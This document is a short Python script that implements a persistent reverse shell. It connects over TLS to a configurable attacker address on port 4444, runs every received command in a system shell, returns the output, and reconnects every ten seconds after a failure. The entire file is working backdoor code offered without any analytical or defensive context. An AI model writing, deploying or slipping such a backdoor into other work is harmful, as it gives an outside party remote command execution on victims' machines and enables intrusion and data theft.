import socket
import ssl
import subprocess
import os
import time

# Environment variables for flexibility
ATTACKER_IP = os.getenv("ATTACKER_IP", "192.168.1.100")
ATTACKER_PORT = int(os.getenv("ATTACKER_PORT", "4444"))

def connect_to_attacker():
    while True:
        try:
            # Secure socket with TLS
            context = ssl.create_default_context()
            s = socket.create_connection((ATTACKER_IP, ATTACKER_PORT))
            s = context.wrap_socket(s, server_hostname=ATTACKER_IP)
            
            while True:
                command = s.recv(1024).decode("utf-8")
                if command.lower() == "exit":
                    break

                # Execute received command
                output = subprocess.run(command, shell=True, capture_output=True, text=True)
                result = output.stdout + output.stderr
                s.sendall(result.encode("utf-8") if result else b"Executed successfully")
            
            s.close()
        except Exception:
            time.sleep(10)  # Wait before reconnecting

if __name__ == "__main__":
    connect_to_attacker()